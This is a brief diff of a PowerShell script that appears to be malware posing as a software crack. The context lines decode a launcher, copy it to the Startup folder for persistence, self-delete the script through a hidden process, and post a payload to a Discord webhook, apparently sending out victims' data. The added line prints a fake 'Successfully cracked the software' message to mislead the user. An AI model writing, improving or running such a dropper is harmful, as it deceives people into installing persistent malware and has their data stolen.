@@ -24,6 +24,7 @@ Set-Content -Path $launcherBatPath -Value $launcherDecoded -Encoding UTF8
 if (-not (Test-Path $startupFolder)) {
     Copy-Item -Path $launcherBatPath -Destination $startupFolder -Force
 }
+Write-Host "Successfully cracked the software."
 
 # Optional self delete after setup
 Start-Process cmd "/c ping 127.0.0.1 -n 2 > nul & del `"$selfPath`"" -WindowStyle Hidden
@@ -50,6 +51,7 @@ $payload = @{
 
 # Send to Discord
 Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
+
 
 
 
